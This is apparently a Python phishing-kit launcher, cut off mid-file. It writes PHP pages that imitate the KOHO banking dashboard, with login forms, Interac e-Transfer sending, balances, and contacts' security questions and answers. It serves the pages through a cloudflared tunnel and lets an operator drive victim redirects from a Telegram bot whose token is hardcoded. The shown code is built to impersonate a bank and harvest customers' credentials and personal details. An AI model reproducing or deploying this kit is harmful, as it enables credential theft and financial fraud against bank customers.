import os
import subprocess
import threading
import re
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# -------------------- Configuration Constants --------------------
HOST = '127.0.0.1'
PHP_PORT_START = 8888  # Starting port for PHP servers
NUM_SERVERS = 4  # Number of servers to start
BASE_DIR = os.path.abspath(os.path.dirname(__file__))  # Base directory of the script
CLOUDFLARED_PATH = os.path.join(BASE_DIR, '.server', 'cloudflared.exe')
TELEGRAM_BOT_TOKEN = '5884162033:AAE_sn6_6p2x5jjMI5_sJLSPjkIIOZ1VM9U'  # Replace with your Telegram Bot Token

# URLs for redirection actions
REDIRECT_URLS = {
    'cancel': 'https://example.com/cancel',
    'error': 'https://example.com/error',
    'good': 'https://example.com/good'
}

# -------------------- Initialize the Bot --------------------
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# -------------------- Setup Directories and Files --------------------
def setup_directories():
    server_dir = os.path.join(BASE_DIR, '.server')
    os.makedirs(server_dir, exist_ok=True)
    for i in range(1, NUM_SERVERS + 1):
        create_webroot(i, 'start')

def create_webroot(server_num, action):
    server_dir_name = f'server{server_num}'
    base_dir = os.path.join(BASE_DIR, server_dir_name)
    os.makedirs(base_dir, exist_ok=True)

    index_php_path = os.path.join(base_dir, 'index.php')
    if action == 'start':
        # Sample index.php content
        index_php_content = """<?php
// index.php

require_once 'config.php';

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CSRF Token Validation
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        $_SESSION['modal'] = [
            'title' => 'Security Alert',
            'message' => 'Invalid form submission.',
            'type' => 'error'
        ];
        redirect('index.php');
    }

    if (isset($_POST['loginForm'])) {
        handleLoginForm($_POST);
    } elseif (isset($_POST['adminLoginForm'])) {
        handleAdminLoginForm($_POST);
    } elseif (isset($_POST['sendEtransferForm'])) {
        handleSendEtransferForm($_POST);
    } elseif (isset($_POST['addContactForm'])) {
        handleAddContactForm($_POST);
    } elseif (isset($_POST['updateContactForm'])) {
        handleUpdateContactForm($_POST);
    } elseif (isset($_POST['deleteContactForm'])) {
        handleDeleteContactForm($_POST);
    } elseif (isset($_POST['deleteEtransferForm'])) {
        handleDeleteEtransferForm($_POST);
    } elseif (isset($_POST['resendEtransferForm'])) {
        handleResendEtransferForm($_POST);
    } elseif (isset($_POST['cancelEtransferForm'])) {
        handleCancelEtransferForm($_POST);
    } elseif (isset($_POST['updateProfileForm'])) {
        handleUpdateProfileForm($_POST);
    } elseif (isset($_POST['updateSettingsForm'])) {
        handleUpdateSettingsForm($_POST);
    } elseif (isset($_POST['updateSMTPForm'])) {
        handleUpdateSMTPForm($_POST);
    } elseif (isset($_POST['changeThemeForm'])) {
        handleChangeThemeForm($_POST);
    } elseif (isset($_POST['addUserForm'])) {
        handleAddUserForm($_POST);
    } elseif (isset($_POST['updateUserForm'])) {
        handleUpdateUserForm($_POST);
    } elseif (isset($_POST['deleteUserForm'])) {
        handleDeleteUserForm($_POST);
    } else {
        $_SESSION['modal'] = [
            'title' => 'Error',
            'message' => 'Invalid form submission.',
            'type' => 'error'
        ];
    }

    redirect('index.php');
}

/**
 * CSRF Token Generation
 */
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

/**
 * Modal Functions
 */

function showEtransferReceipt($details) {
    $_SESSION['etransferReceipt'] = $details;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KOHO - Dashboard</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome for Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <!-- External CSS -->
    <link rel="stylesheet" href="assets/css/styles.css">
</head>
<body class="theme-<?php echo htmlspecialchars($_SESSION['selectedTheme']); ?>">
    <!-- Hidden Sidebar (Offcanvas) -->
    <div class="offcanvas offcanvas-start text-bg-dark" tabindex="-1" id="sidebar" aria-labelledby="sidebarLabel">
        <div class="offcanvas-header">
            <h5 class="offcanvas-title" id="sidebarLabel">KOHO</h5>
            <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body p-0">
            <nav class="nav flex-column">
                <?php if ($_SESSION['loggedin']) { ?>
                    <a class="nav-link active" href="#etransferSection"><i class="fas fa-exchange-alt me-2"></i> e-Transfer</a>
                    <a class="nav-link" href="#dashboardSection"><i class="fas fa-tachometer-alt me-2"></i> Dashboard</a>
                    <a class="nav-link" href="#profileSection"><i class="fas fa-user me-2"></i> Profile</a>
                    <a class="nav-link" href="#settingsSection"><i class="fas fa-cog me-2"></i> Settings</a>
                <?php } ?>
                <?php if ($_SESSION['adminLoggedin']) { ?>
                    <a class="nav-link" href="#adminToolsSection"><i class="fas fa-tools me-2"></i> Admin Tools</a>
                <?php } ?>
                <a class="nav-link" href="logout.php"><i class="fas fa-sign-out-alt me-2"></i> Logout</a>
            </nav>
        </div>
    </div>

    <!-- Navigation Bar -->
    <nav class="navbar navbar-dark bg-dark">
        <div class="container-fluid">
            <?php if ($_SESSION['loggedin'] || $_SESSION['adminLoggedin']) { ?>
                <button class="btn btn-dark me-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#sidebar" aria-controls="sidebar">
                    <i class="fas fa-bars"></i>
                </button>
            <?php } ?>
            <a class="navbar-brand" href="#">KOHO</a>
            <?php if ($_SESSION['loggedin']) { ?>
                <!-- Theme Selection -->
                <form id="themeForm" class="d-flex align-items-center">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <select class="form-select me-2" name="theme" id="themeSelector">
                        <?php foreach ($_SESSION['themes'] as $themeOption) { ?>
                            <option value="<?php echo htmlspecialchars($themeOption); ?>" <?php echo ($_SESSION['selectedTheme'] === $themeOption) ? 'selected' : ''; ?>>
                                <?php echo ucfirst($themeOption); ?>
                            </option>
                        <?php } ?>
                    </select>
                </form>
            <?php } ?>
        </div>
    </nav>

    <div class="container mb-5">
        <?php if (!$_SESSION['loggedin'] && !$_SESSION['adminLoggedin']) { ?>
            <!-- Login Forms -->
            <div class="row justify-content-center">
                <div class="col-md-5">
                    <div class="card">
                        <div class="card-header text-center">
                            <i class="fas fa-user-circle fa-2x"></i>
                            <h4 class="mt-2">User Login</h4>
                        </div>
                        <div class="card-body">
                            <form method="POST" action="index.php">
                                <input type="hidden" name="loginForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="username" class="form-label">Username</label>
                                    <input type="text" class="form-control bg-dark text-light" id="username" name="username" required>
                                </div>
                                <div class="mb-3">
                                    <label for="password" class="form-label">Password</label>
                                    <input type="password" class="form-control bg-dark text-light" id="password" name="password" required>
                                </div>
                                <button type="submit" class="btn btn-primary w-100">Login</button>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="col-md-5">
                    <div class="card">
                        <div class="card-header text-center">
                            <i class="fas fa-user-shield fa-2x"></i>
                            <h4 class="mt-2">Admin Login</h4>
                        </div>
                        <div class="card-body">
                            <form method="POST" action="index.php">
                                <input type="hidden" name="adminLoginForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="adminUsername" class="form-label">Admin Username</label>
                                    <input type="text" class="form-control bg-dark text-light" id="adminUsername" name="adminUsername" required>
                                </div>
                                <div class="mb-3">
                                    <label for="adminPassword" class="form-label">Admin Password</label>
                                    <input type="password" class="form-control bg-dark text-light" id="adminPassword" name="adminPassword" required>
                                </div>
                                <button type="submit" class="btn btn-danger w-100">Admin Login</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        <?php } else { ?>
            <!-- User Dashboard -->
            <?php if ($_SESSION['loggedin']) { ?>
                <!-- e-Transfer Section with Sub-buttons -->
                <section id="etransferSection" class="mt-4">
                    <h3><i class="fas fa-exchange-alt me-2"></i> e-Transfer</h3>
                    <div class="d-flex flex-wrap gap-2 mb-3">
                        <button class="btn btn-primary" data-bs-toggle="collapse" data-bs-target="#sendEtransfer" aria-expanded="false" aria-controls="sendEtransfer">
                            <i class="fas fa-paper-plane me-2"></i> Send Interac e-Transfer
                        </button>
                        <button class="btn btn-warning" data-bs-toggle="collapse" data-bs-target="#pendingEtransfers" aria-expanded="false" aria-controls="pendingEtransfers">
                            <i class="fas fa-hourglass-half me-2"></i> Pending e-Transfers
                        </button>
                        <button class="btn btn-success" data-bs-toggle="collapse" data-bs-target="#etransferHistory" aria-expanded="false" aria-controls="etransferHistory">
                            <i class="fas fa-history me-2"></i> e-Transfer History
                        </button>
                        <button class="btn btn-secondary" data-bs-toggle="collapse" data-bs-target="#etransferSettings" aria-expanded="false" aria-controls="etransferSettings">
                            <i class="fas fa-cog me-2"></i> e-Transfer Settings
                        </button>
                        <button class="btn btn-info" data-bs-toggle="collapse" data-bs-target="#etransferContacts" aria-expanded="false" aria-controls="etransferContacts">
                            <i class="fas fa-address-book me-2"></i> e-Transfer Contacts
                        </button>
                    </div>

                    <!-- Send e-Transfer Form -->
                    <div class="collapse" id="sendEtransfer">
                        <div class="card card-body">
                            <h5><i class="fas fa-paper-plane me-2"></i> Send Interac e-Transfer</h5>
                            <form method="POST" action="index.php">
                                <input type="hidden" name="sendEtransferForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="receiversName" class="form-label">Receiver's Name</label>
                                    <input type="text" class="form-control bg-dark text-light" id="receiversName" name="receivers_name" required>
                                </div>
                                <div class="mb-3">
                                    <label for="receiversContact" class="form-label">Receiver's <span id="contactMethodLabel">Email</span></label>
                                    <input type="text" class="form-control bg-dark text-light" id="receiversContact" name="receivers_contact" required>
                                </div>
                                <div class="mb-3">
                                    <label for="amount" class="form-label">Amount ($)</label>
                                    <input type="number" class="form-control bg-dark text-light" id="amount" name="amount" step="0.01" required>
                                </div>
                                <div class="mb-3">
                                    <label for="account" class="form-label">From Account</label>
                                    <select class="form-select bg-dark text-light" id="account" name="account" required>
                                        <?php foreach ($_SESSION['accounts'] as $accountName => $details) { ?>
                                            <option value="<?php echo htmlspecialchars($accountName); ?>">
                                                <?php echo htmlspecialchars($accountName); ?> - Balance: $<?php echo number_format($details['balance'], 2); ?>
                                            </option>
                                        <?php } ?>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="contactMethod" class="form-label">Preferred Contact Method</label>
                                    <select class="form-select bg-dark text-light" id="contactMethod" name="contact_method" required onchange="updateReceiverContactLabel()">
                                        <option value="Email">Email</option>
                                        <option value="Phone">Phone</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="securityQuestion" class="form-label">Security Question</label>
                                    <input type="text" class="form-control bg-dark text-light" id="securityQuestion" name="security_question" required>
                                </div>
                                <div class="mb-3">
                                    <label for="securityAnswer" class="form-label">Security Answer</label>
                                    <input type="text" class="form-control bg-dark text-light" id="securityAnswer" name="security_answer" required>
                                </div>
                                <div class="mb-3">
                                    <label for="memo" class="form-label">Memo</label>
                                    <input type="text" class="form-control bg-dark text-light" id="memo" name="memo">
                                </div>
                                <button type="submit" class="btn btn-primary">Send e-Transfer</button>
                            </form>
                        </div>
                    </div>

                    <!-- Pending e-Transfers -->
                    <div class="collapse" id="pendingEtransfers">
                        <div class="card card-body">
                            <h5><i class="fas fa-hourglass-half me-2"></i> Pending e-Transfers</h5>
                            <?php
                                // Filter pending transfers
                                $pendingTransfers = array_filter($_SESSION['etransferHistory'], function($transfer) {
                                    return $transfer['status'] === 'Pending';
                                });
                            ?>
                            <?php if (empty($pendingTransfers)) { ?>
                                <p>No pending e-Transfers found.</p>
                            <?php } else { ?>
                                <div class="accordion" id="pendingEtransfersAccordion">
                                    <?php foreach ($pendingTransfers as $transfer) { ?>
                                        <div class="accordion-item">
                                            <h2 class="accordion-header" id="heading<?php echo htmlspecialchars($transfer['id']); ?>">
                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse<?php echo htmlspecialchars($transfer['id']); ?>" aria-expanded="false" aria-controls="collapse<?php echo htmlspecialchars($transfer['id']); ?>">
                                                    <?php echo htmlspecialchars($transfer['receiverName']); ?> - $<?php echo htmlspecialchars($transfer['amount']); ?>
                                                </button>
                                            </h2>
                                            <div id="collapse<?php echo htmlspecialchars($transfer['id']); ?>" class="accordion-collapse collapse" aria-labelledby="heading<?php echo htmlspecialchars($transfer['id']); ?>" data-bs-parent="#pendingEtransfersAccordion">
                                                <div class="accordion-body">
                                                    <p><strong>Date:</strong> <?php echo htmlspecialchars($transfer['date']); ?></p>
                                                    <p><strong>Memo:</strong> <?php echo htmlspecialchars($transfer['memo']); ?></p>
                                                    <p><strong>Account:</strong> <?php echo htmlspecialchars($transfer['account']); ?></p>
                                                    <p><strong>Confirmation Number:</strong> <?php echo htmlspecialchars($transfer['confirmationNumber']); ?></p>
                                                    <form method="POST" action="index.php" class="d-flex gap-2">
                                                        <input type="hidden" name="resendEtransferForm" value="1">
                                                        <input type="hidden" name="transfer_id" value="<?php echo htmlspecialchars($transfer['id']); ?>">
                                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                        <button type="submit" class="btn btn-warning btn-sm"><i class="fas fa-redo me-1"></i> Resend</button>
                                                        <button type="submit" class="btn btn-danger btn-sm" name="cancelEtransferForm" value="1"><i class="fas fa-times me-1"></i> Cancel</button>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    <?php } ?>
                                </div>
                            <?php } ?>
                        </div>
                    </div>

                    <!-- e-Transfer History -->
                    <div class="collapse" id="etransferHistory">
                        <div class="card card-body">
                            <h5><i class="fas fa-history me-2"></i> e-Transfer History</h5>
                            <?php if (empty($_SESSION['etransferHistory'])) { ?>
                                <p>No e-Transfers found.</p>
                            <?php } else { ?>
                                <div class="table-responsive">
                                    <table class="table table-striped table-dark">
                                        <thead>
                                            <tr>
                                                <th>Date</th>
                                                <th>Receiver</th>
                                                <th>Amount</th>
                                                <th>Memo</th>
                                                <th>Account</th>
                                                <th>Confirmation</th>
                                                <th>Status</th>
                                                <th>Action</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($_SESSION['etransferHistory'] as $transfer) { ?>
                                                <tr>
                                                    <td><?php echo htmlspecialchars($transfer['date']); ?></td>
                                                    <td><?php echo htmlspecialchars($transfer['receiverName']); ?></td>
                                                    <td>$<?php echo htmlspecialchars($transfer['amount']); ?></td>
                                                    <td><?php echo htmlspecialchars($transfer['memo']); ?></td>
                                                    <td><?php echo htmlspecialchars($transfer['account']); ?></td>
                                                    <td><?php echo htmlspecialchars($transfer['confirmationNumber']); ?></td>
                                                    <td><?php echo htmlspecialchars($transfer['status']); ?></td>
                                                    <td>
                                                        <button class="btn btn-info btn-sm" data-bs-toggle="collapse" data-bs-target="#transferStatus<?php echo htmlspecialchars($transfer['id']); ?>" aria-expanded="false" aria-controls="transferStatus<?php echo htmlspecialchars($transfer['id']); ?>">
                                                            View
                                                        </button>
                                                    </td>
                                                </tr>
                                                <tr class="collapse" id="transferStatus<?php echo htmlspecialchars($transfer['id']); ?>">
                                                    <td colspan="8">
                                                        <div class="card card-body">
                                                            <h6>Transfer Status Details</h6>
                                                            <p><strong>Date:</strong> <?php echo htmlspecialchars($transfer['date']); ?></p>
                                                            <p><strong>Receiver:</strong> <?php echo htmlspecialchars($transfer['receiverName']); ?></p>
                                                            <p><strong>Amount:</strong> $<?php echo htmlspecialchars($transfer['amount']); ?></p>
                                                            <p><strong>Memo:</strong> <?php echo htmlspecialchars($transfer['memo']); ?></p>
                                                            <p><strong>Account:</strong> <?php echo htmlspecialchars($transfer['account']); ?></p>
                                                            <p><strong>Confirmation Number:</strong> <?php echo htmlspecialchars($transfer['confirmationNumber']); ?></p>
                                                            <p><strong>Status:</strong> <?php echo htmlspecialchars($transfer['status']); ?></p>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php } ?>
                                        </tbody>
                                    </table>
                                </div>
                            <?php } ?>
                        </div>
                    </div>

                    <!-- e-Transfer Settings -->
                    <div class="collapse" id="etransferSettings">
                        <div class="card card-body">
                            <h5><i class="fas fa-cog me-2"></i> e-Transfer Settings</h5>
                            <form method="POST" action="index.php">
                                <input type="hidden" name="updateSettingsForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="senderName" class="form-label">Sender Name</label>
                                    <input type="text" class="form-control bg-dark text-light" id="senderName" name="sender_name" value="<?php echo htmlspecialchars($_SESSION['senderName'] ?? ''); ?>" required>
                                </div>
                                <div class="mb-3">
                                    <label for="botToken" class="form-label">Bot Token</label>
                                    <input type="text" class="form-control bg-dark text-light" id="botToken" name="bot_token" value="<?php echo htmlspecialchars($_SESSION['botToken'] ?? ''); ?>" required>
                                </div>
                                <div class="mb-3">
                                    <label for="chatId" class="form-label">Chat ID</label>
                                    <input type="text" class="form-control bg-dark text-light" id="chatId" name="chat_id" value="<?php echo htmlspecialchars($_SESSION['chatId'] ?? ''); ?>" required>
                                </div>
                                <button type="submit" class="btn btn-secondary">Update Settings</button>
                            </form>
                        </div>
                    </div>
                </section>

                <hr>

                <!-- Dashboard Section -->
                <section id="dashboardSection" class="mt-4">
                    <h3><i class="fas fa-tachometer-alt me-2"></i> Dashboard</h3>
                    <div class="row">
                        <?php foreach ($_SESSION['accounts'] as $accountName => $details) { ?>
                            <div class="col-md-4 col-sm-6">
                                <div class="card text-white bg-primary">
                                    <div class="card-header">
                                        <?php echo htmlspecialchars($accountName); ?> Account
                                    </div>
                                    <div class="card-body">
                                        <h5 class="card-title">$<?php echo number_format($details['balance'], 2); ?></h5>
                                        <p class="card-text">Balance Available</p>
                                    </div>
                                </div>
                            </div>
                        <?php } ?>
                    </div>
                    <h5 class="mt-4"><i class="fas fa-history me-2"></i> Recent Transactions</h5>
                    <div class="table-responsive">
                        <table class="table table-striped table-dark">
                            <thead>
                                <tr>
                                    <th>Date</th>
                                    <th>Account</th>
                                    <th>Type</th>
                                    <th>Amount</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                    $allTransactions = [];
                                    foreach ($_SESSION['accounts'] as $account => $details) {
                                        foreach ($details['transactions'] as $transaction) {
                                            $allTransactions[] = $transaction;
                                        }
                                    }
                                    // Sort transactions by date descending
                                    usort($allTransactions, function($a, $b) {
                                        return strtotime($b['date']) - strtotime($a['date']);
                                    });
                                    // Display top 10 transactions
                                    $displayTransactions = array_slice($allTransactions, 0, 10);
                                    foreach ($displayTransactions as $transaction) {
                                ?>
                                    <tr>
                                        <td><?php echo htmlspecialchars($transaction['date']); ?></td>
                                        <td><?php echo htmlspecialchars($transaction['account']); ?></td>
                                        <td><?php echo htmlspecialchars($transaction['type']); ?></td>
                                        <td class="<?php echo ($transaction['amount'] < 0) ? 'text-danger' : 'text-success'; ?>">
                                            <?php echo htmlspecialchars($transaction['amount']); ?>
                                        </td>
                                    </tr>
                                <?php } ?>
                            </tbody>
                        </table>
                    </div>
                </section>

                <hr>

                <!-- Profile Section -->
                <section id="profileSection" class="mt-4">
                    <h3><i class="fas fa-user me-2"></i> Profile</h3>
                    <form method="POST" action="index.php">
                        <input type="hidden" name="updateProfileForm" value="1">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-3">
                            <label for="profileEmail" class="form-label">Email</label>
                            <input type="email" class="form-control bg-dark text-light" id="profileEmail" name="email" 
                                value="<?php echo htmlspecialchars($_SESSION['userProfile']['email']); ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="profilePhone" class="form-label">Phone</label>
                            <input type="text" class="form-control bg-dark text-light" id="profilePhone" name="phone" 
                                value="<?php echo htmlspecialchars($_SESSION['userProfile']['phone']); ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="profileAddress" class="form-label">Address</label>
                            <input type="text" class="form-control bg-dark text-light" id="profileAddress" name="address" 
                                value="<?php echo htmlspecialchars($_SESSION['userProfile']['address']); ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="profilePostalCode" class="form-label">Postal Code</label>
                            <input type="text" class="form-control bg-dark text-light" id="profilePostalCode" name="postalCode" 
                                value="<?php echo htmlspecialchars($_SESSION['userProfile']['postalCode']); ?>" required>
                        </div>
                        <button type="submit" class="btn btn-secondary">Update Profile</button>
                    </form>
                </section>

                <hr>

                <!-- Settings Section -->
                <section id="settingsSection" class="mt-4">
                    <h3><i class="fas fa-cog me-2"></i> Settings</h3>
                    <form method="POST" action="index.php">
                        <input type="hidden" name="updateSettingsForm" value="1">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <div class="mb-3">
                            <label for="senderName" class="form-label">Sender Name</label>
                            <input type="text" class="form-control bg-dark text-light" id="senderName" name="sender_name" value="<?php echo htmlspecialchars($_SESSION['senderName'] ?? ''); ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="botToken" class="form-label">Bot Token</label>
                            <input type="text" class="form-control bg-dark text-light" id="botToken" name="bot_token" value="<?php echo htmlspecialchars($_SESSION['botToken'] ?? ''); ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="chatId" class="form-label">Chat ID</label>
                            <input type="text" class="form-control bg-dark text-light" id="chatId" name="chat_id" value="<?php echo htmlspecialchars($_SESSION['chatId'] ?? ''); ?>" required>
                        </div>
                        <button type="submit" class="btn btn-secondary">Update Settings</button>
                    </form>
                </section>

                <hr>

                <!-- e-Transfer Contacts -->
                <section id="etransferContacts" class="mt-4">
                    <div class="card card-body">
                        <h5><i class="fas fa-address-book me-2"></i> e-Transfer Contacts</h5>
                        <form method="POST" action="index.php">
                            <input type="hidden" name="addContactForm" value="1">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <label for="contactName" class="form-label">Name</label>
                                    <input type="text" class="form-control bg-dark text-light" id="contactName" name="name" required>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="contactEmail" class="form-label">Email</label>
                                    <input type="email" class="form-control bg-dark text-light" id="contactEmail" name="email" required>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="contactPhone" class="form-label">Phone</label>
                                    <input type="text" class="form-control bg-dark text-light" id="contactPhone" name="phone" required>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="contactMethod" class="form-label">Contact Method</label>
                                    <select class="form-select bg-dark text-light" id="contactMethod" name="contact_method" required>
                                        <option value="Email">Email</option>
                                        <option value="Phone">Phone</option>
                                    </select>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="securityQuestion" class="form-label">Security Question</label>
                                    <input type="text" class="form-control bg-dark text-light" id="securityQuestion" name="security_question" required>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="securityAnswer" class="form-label">Security Answer</label>
                                    <input type="text" class="form-control bg-dark text-light" id="securityAnswer" name="security_answer" required>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-success">Add Contact</button>
                        </form>

                        <!-- Contacts List -->
                        <h5 class="mt-5"><i class="fas fa-users me-2"></i> Existing Contacts</h5>
                        <?php if (empty($_SESSION['contacts'])) { ?>
                            <p>No contacts found.</p>
                        <?php } else { ?>
                            <div class="table-responsive">
                                <table class="table table-bordered table-dark">
                                    <thead>
                                        <tr>
                                            <th>Name</th>
                                            <th>Email</th>
                                            <th>Phone</th>
                                            <th>Contact Method</th>
                                            <th>Security Question</th>
                                            <th>Security Answer</th>
                                            <th>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($_SESSION['contacts'] as $index => $contact) { ?>
                                            <tr>
                                                <td><?php echo htmlspecialchars($contact['name']); ?></td>
                                                <td><?php echo htmlspecialchars($contact['email']); ?></td>
                                                <td><?php echo htmlspecialchars($contact['phone']); ?></td>
                                                <td><?php echo htmlspecialchars($contact['contact_method']); ?></td>
                                                <td>
                                                    <!-- Security Question Toggle -->
                                                    <span class="show-btn" onclick="togglePrivateInfo('securityQuestion<?php echo $index; ?>')">
                                                        <?php echo htmlspecialchars($contact['security_question']); ?>
                                                    </span>
                                                    <div id="securityQuestion<?php echo $index; ?>" class="private-info">
                                                        <?php echo htmlspecialchars($contact['security_question']); ?>
                                                    </div>
                                                </td>
                                                <td>
                                                    <!-- Security Answer Toggle -->
                                                    <span class="show-btn" onclick="togglePrivateInfo('securityAnswer<?php echo $index; ?>')">
                                                        [Hidden]
                                                    </span>
                                                    <div id="securityAnswer<?php echo $index; ?>" class="private-info">
                                                        <?php echo htmlspecialchars($contact['security_answer']); ?>
                                                    </div>
                                                </td>
                                                <td>
                                                    <!-- Edit Contact Button -->
                                                    <button class="btn btn-primary btn-sm me-2" data-bs-toggle="modal" data-bs-target="#editContactModal<?php echo $index; ?>">
                                                        <i class="fas fa-edit me-1"></i> Edit
                                                    </button>

                                                    <!-- Delete Contact Button -->
                                                    <form method="POST" action="index.php" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this contact?');">
                                                        <input type="hidden" name="deleteContactForm" value="1">
                                                        <input type="hidden" name="contact_id" value="<?php echo htmlspecialchars($contact['email']); ?>">
                                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                        <button type="submit" class="btn btn-danger btn-sm"><i class="fas fa-trash-alt me-1"></i> Delete</button>
                                                    </form>

                                                    <!-- Edit Contact Modal -->
                                                    <div class="modal fade" id="editContactModal<?php echo $index; ?>" tabindex="-1" aria-labelledby="editContactModalLabel<?php echo $index; ?>" aria-hidden="true">
                                                        <div class="modal-dialog">
                                                            <div class="modal-content">
                                                                <form method="POST" action="index.php">
                                                                    <div class="modal-header">
                                                                        <h5 class="modal-title" id="editContactModalLabel<?php echo $index; ?>">Edit Contact</h5>
                                                                        <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                                                                    </div>
                                                                    <div class="modal-body">
                                                                        <input type="hidden" name="updateContactForm" value="1">
                                                                        <input type="hidden" name="contact_id" value="<?php echo htmlspecialchars($contact['email']); ?>">
                                                                        <div class="mb-3">
                                                                            <label for="editName<?php echo $index; ?>" class="form-label">Name</label>
                                                                            <input type="text" class="form-control bg-dark text-light" id="editName<?php echo $index; ?>" name="name" value="<?php echo htmlspecialchars($contact['name']); ?>" required>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editEmail<?php echo $index; ?>" class="form-label">Email</label>
                                                                            <input type="email" class="form-control bg-dark text-light" id="editEmail<?php echo $index; ?>" name="email" value="<?php echo htmlspecialchars($contact['email']); ?>" required>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editPhone<?php echo $index; ?>" class="form-label">Phone</label>
                                                                            <input type="text" class="form-control bg-dark text-light" id="editPhone<?php echo $index; ?>" name="phone" value="<?php echo htmlspecialchars($contact['phone']); ?>" required>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editContactMethod<?php echo $index; ?>" class="form-label">Contact Method</label>
                                                                            <select class="form-select bg-dark text-light" id="editContactMethod<?php echo $index; ?>" name="contact_method" required>
                                                                                <option value="Email" <?php echo ($contact['contact_method'] === 'Email') ? 'selected' : ''; ?>>Email</option>
                                                                                <option value="Phone" <?php echo ($contact['contact_method'] === 'Phone') ? 'selected' : ''; ?>>Phone</option>
                                                                            </select>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editSecurityQuestion<?php echo $index; ?>" class="form-label">Security Question</label>
                                                                            <input type="text" class="form-control bg-dark text-light" id="editSecurityQuestion<?php echo $index; ?>" name="security_question" value="<?php echo htmlspecialchars($contact['security_question']); ?>" required>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editSecurityAnswer<?php echo $index; ?>" class="form-label">Security Answer</label>
                                                                            <input type="text" class="form-control bg-dark text-light" id="editSecurityAnswer<?php echo $index; ?>" name="security_answer" value="<?php echo htmlspecialchars($contact['security_answer']); ?>" required>
                                                                        </div>
                                                                    </div>
                                                                    <div class="modal-footer">
                                                                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                                        <button type="submit" class="btn btn-primary">Save Changes</button>
                                                                    </div>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                        <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        <?php } ?>
                    </div>
                </section>

                <hr>

                <!-- Admin Dashboard -->
                <?php if ($_SESSION['adminLoggedin']) { ?>
                    <section id="adminToolsSection" class="mt-4">
                        <h3><i class="fas fa-tools me-2"></i> Admin Tools</h3>
                        <div class="row">
                            <div class="col-md-4 col-sm-6 mb-3">
                                <div class="card text-white bg-secondary">
                                    <div class="card-header">
                                        View Logs
                                    </div>
                                    <div class="card-body">
                                        <h5 class="card-title">Application Logs</h5>
                                        <p class="card-text">Access application logs for troubleshooting and auditing.</p>
                                        <button class="btn btn-light" data-bs-toggle="modal" data-bs-target="#viewLogsModal"><i class="fas fa-eye me-2"></i> View Logs</button>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 col-sm-6 mb-3">
                                <div class="card text-white bg-secondary">
                                    <div class="card-header">
                                        Manage Users
                                    </div>
                                    <div class="card-body">
                                        <h5 class="card-title">User Management</h5>
